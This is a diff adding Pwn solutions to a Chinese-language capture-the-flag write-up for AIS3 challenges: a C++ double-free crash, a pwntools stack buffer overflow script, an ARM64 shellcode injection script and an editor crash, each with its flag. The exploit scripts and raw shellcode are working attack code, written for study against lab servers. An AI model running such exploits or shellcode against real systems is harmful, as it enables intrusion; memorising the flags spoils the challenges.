@@ -307,6 +307,124 @@ total 32K
 
 ## Pwn
 
+### SAAS — Crash
+
+1.  `String` 的 [destructor](https://en.cppreference.com/w/cpp/language/destructor) 會把 `str` delete 掉，但沒有把 `str` 設回 `nullptr`，留下 dangling pointer。而 `print` 會呼叫 [copy constructor](https://en.cppreference.com/w/cpp/language/copy_constructor) 把 `s` 的 member 都 copy 過來，然後在 `print` 結束時呼叫 `String` 的 destructor 把 `s` 清掉，因此只要連續 `print` 兩次，就可以 double free `s.str`。
+```cpp
+class String {
+   public:
+	char *str;
+	size_t len;
+
+	String(const char *s) {
+		len = strlen(s);
+		str = new char[len + 1];
+		strcpy(str, s);
+	}
+	~String() { delete[] str; }
+};
+
+void print(String s) {
+	printf("Length: %zu\n", s.len);
+	printf("Content: ");
+	write(1, s.str, s.len);
+	printf("\n");
+}
+```
+
+2. 建立 string 之後 print 兩次得到 flag。
+
+```bash
+===== S(tring)AAS =====
+1. Create string
+2. Edit string
+3. Print string
+4. Delete string
+> 1
+Index: 0
+Content: aaaa
+===== S(tring)AAS =====
+1. Create string
+2. Edit string
+3. Print string
+4. Delete string
+> 3
+Index: 0
+Length: 4
+Content: aaaa
+===== S(tring)AAS =====
+1. Create string
+2. Edit string
+3. Print string
+4. Delete string
+> 3
+Index: 0
+Length: 4
+Content:
+free(): double free detected in tcache 2
+Aborted (core dumped)
+```
+
+**Flag: `AIS3{congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?}`**
+
+### BOF2WIN
+
+1. 純粹的 stack buffer overflow。
+```python
+from pwn import *
+
+p = remote('127.0.0.1', 12347)
+p = remote('chals1.ais3.org', 12347)
+
+flag_adr = 0x401216
+
+payload = b'A'*24
+payload += flag_adr.to_bytes(8, 'little')
+
+p.recv()
+p.sendline(payload)
+print(p.recv())
+print(p.recv().strip(b'\x00').decode())
+```
+
+**Flag: `AIS3{Re@1_B0F_m4st3r!!}`**
+
+### Give Me SC
+
+1. 不會寫 ARM64 shellcode 就上網找一份來用。
+
+```python
+from pwn import *
+
+p = remote('127.0.0.1', 15566)
+p = remote('chals1.ais3.org', 15566)
+
+# ref: https://www.exploit-db.com/exploits/47048
+shellcode = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
+
+p.recv()
+p.send(b'AAAA')
+p.recv()
+p.send(shellcode)
+print(p.recv())
+p.sendline(b'cat home/give_me_sc/flag')
+print(p.recv().decode())
+print(p.recv().decode())
+# p.interactive()
+```
+
+**Flag: `AIS3{Y0uR_f1rst_Aarch64_Shellcoding}`**
+
+### Magic
+
+To be written...
+
+### UTF-8 Editor — Crash
+
+1. 輸入 `你ㄏ`，讓 `ㄏ` 注音組字的階段，然後刪掉 `你ㄏ`，會留下一個類似空白的東西，輸入進去，然後 print 就解了。
+2. 猜測應該是我的環境有一些編碼問題之類的，肯定不是 intended XD
+
+**Flag: `AIS3{unsigned_intergers_are_so_cool}`**
 
 ## Crypto
 
